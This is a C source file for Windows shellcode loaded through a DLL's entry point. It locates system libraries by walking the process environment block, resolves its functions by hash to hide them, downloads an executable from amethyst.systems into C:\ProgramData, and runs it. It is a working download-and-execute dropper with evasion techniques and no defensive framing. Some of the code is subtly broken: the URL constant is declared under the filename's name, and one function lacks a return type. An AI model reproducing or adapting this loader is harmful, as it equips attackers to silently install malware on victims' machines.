#include "shellcode.h"

BOOL DllMain(HINSTANCE dll_instance, DWORD reason, LPVOID reserved) {
   return shellcode(dll_instance) == 0;
}

#pragma section(".sc$000", read, execute)
__declspec(code_seg(".sc$000")) int shellcode(LPVOID arg) {
#if defined(_M_IX86)
   iat()->peb = ((PPEB_EX)__readfsdword(0x30));
#elif defined(_M_AMD64)
   iat()->peb = ((PPEB_EX)__readgsqword(0x60));
#endif
   
   PPEB_LDR_DATA_EX ldr_ex = (PPEB_LDR_DATA_EX)iat()->peb->LoaderData;
   PLDR_DATA_TABLE_ENTRY_EX list_entry = (PLDR_DATA_TABLE_ENTRY_EX)ldr_ex->InLoadOrderModuleList.Flink;
   PLDR_DATA_TABLE_ENTRY_EX ntdll_entry = (PLDR_DATA_TABLE_ENTRY_EX)list_entry->InLoadOrderLinks.Flink;
   PLDR_DATA_TABLE_ENTRY_EX kernel32_entry = (PLDR_DATA_TABLE_ENTRY_EX)ntdll_entry->InLoadOrderLinks.Flink;

   uint8_t *kernel32 = (uint8_t *)kernel32_entry->DllBase;
   iat()->LoadLibrary = (uint8_t * (WINAPI *)(const char *))get_import_by_hash(kernel32, 0x53b2070f);
   iat()->CreateProcess = (BOOL (WINAPI *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))get_import_by_hash(kernel32, 0x4a7c0a09);

   char urlmon_str[] = {'u','r','l','m','o','n', 0};
   uint8_t *urlmon = (uint8_t *)iat()->LoadLibrary(&urlmon_str[0]);
   iat()->URLDownloadToFile = (HRESULT (WINAPI *)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK))get_import_by_hash(urlmon, 0xd8d746fc);

   char *filename = target_filename();
   char *url = target_url();
   STARTUPINFOA startup_info;
   PROCESS_INFORMATION process_information;

   for (size_t i=0; i<sizeof(STARTUPINFOA); ++i)
      ((uint8_t *)(&startup_info))[i] = 0;
   
   startup_info.cb = sizeof(STARTUPINFOA);
   
   for (size_t i=0; i<sizeof(PROCESS_INFORMATION); ++i)
      ((uint8_t *)(&process_information))[i] = 0;

   if (iat()->URLDownloadToFile(NULL, url, filename, 0, NULL) != S_OK)
      return 1;

   if (!iat()->CreateProcess(filename, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_information))
      return 2;
   
   return 0;
}

#if defined(_M_AMD64)
#pragma section(".sc$001", read, execute)
__declspec(code_seg(".sc$001")) IAT *iat(void) {
   return &IMPORT_TABLE;
}
#elif defined(_M_IX86)
#pragma section(".sc$001", read, execute)
__declspec(code_seg(".sc$001"), naked) IAT *iat(void) {
   __asm {
      call eip_call
   eip_call:
      pop eax
      add eax, 5
      ret
   }
}
#endif

#pragma section(".sc$002", read, execute)
__declspec(allocate(".sc$002")) IAT IMPORT_TABLE = {NULL, NULL, NULL};

#pragma section(".sc$003", read, execute)
__declspec(code_seg(".sc$003")) get_import_by_hash(uint8_t *module, uint32_t hash) {
   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)module;
#if defined(_M_AMD64)
   PIMAGE_NT_HEADERS64 nt_headers = (PIMAGE_NT_HEADERS64)&module[dos_header->e_lfanew];
#elif defined(_M_IX86)
   PIMAGE_NT_HEADERS32 nt_headers = (PIMAGE_NT_HEADERS32)&module[dos_header->e_lfanew];
#endif
   
   PIMAGE_DATA_DIRECTORY export_datadir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
   PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)&module[export_datadir->VirtualAddress];
   uint32_t *functions = (uint32_t *)&module[export_dir->AddressOfFunctions];
   uint32_t *names = (uint32_t *)&module[export_dir->AddressOfNames];
   uint16_t *name_ordinals = (uint16_t *)&module[export_dir->AddressOfNameOrdinals];

   for (size_t i=0; i<export_dir->NumberOfNames; ++i) {
      if (fnv321a((const char *)&module[names[i]]) != hash)
         continue;
      
      if (functions[name_ordinals[i]] >= export_datadir->VirtualAddress && functions[name_ordinals[i]] < export_datadir->VirtualAddress+export_datadir->Size) {
         const char *forwarder = (const char *)&module[functions[name_ordinals[i]]];
         char forwarder_mut[256];
         
         memcpy_local(&forwarder_mut[0], forwarder, strlen_local(forwarder)+1);
         char *func;

         for (size_t j=0; j<strlen_local(forwarder); ++j) {
            if (forwarder_mut[j] != '.')
               continue;

            forwarder_mut[j] = 0;
            func = &forwarder_mut[j+1];
            break;
         }

         uint8_t *forward_dll = iat()->LoadLibrary(forwarder_mut);
         uint8_t *proc = get_import_by_hash(forward_dll, fnv321a(func));

         return proc;
      }
         
      return &module[functions[name_ordinals[i]]];
   }

   return NULL;
}

#if defined(_M_AMD64)
#pragma section(".sc$004", read, execute)
__declspec(code_seg(".sc$004")) char *target_filename(void) {
   return &TARGET_FILENAME[0];
}
#elif defined(_M_IX86)
#pragma section(".sc$004", read, execute)
__declspec(code_seg(".sc$004"), naked) char *target_filename(void) {
   __asm {
      call eip_call
   eip_call:
      pop eax
      add eax, 5
      ret
   }
}
#pragma comment(linker, "/INCLUDE:TARGET_FILENAME")
#endif

#pragma section(".sc$005", read, execute)
__declspec(allocate(".sc$005")) char TARGET_FILENAME[] = "C:\\ProgramData\\sheep.exe";

#if defined(_M_AMD64)
#pragma section(".sc$006", read, execute)
__declspec(code_seg(".sc$006")) char *target_url(void) {
   return &TARGET_URL[0];
}
#elif defined(_M_IX86)
#pragma section(".sc$006", read, execute)
__declspec(code_seg(".sc$006"), naked) char *target_url(void) {
   __asm {
      call eip_call
   eip_call:
      pop eax
      add eax, 5
      ret
   }
}
#pragma comment(linker, "/INCLUDE:TARGET_URL")
#endif

#pragma section(".sc$007", read, execute)
__declspec(allocate(".sc$007")) char TARGET_FILENAME[] = "https://amethyst.systems/sheep.exe";
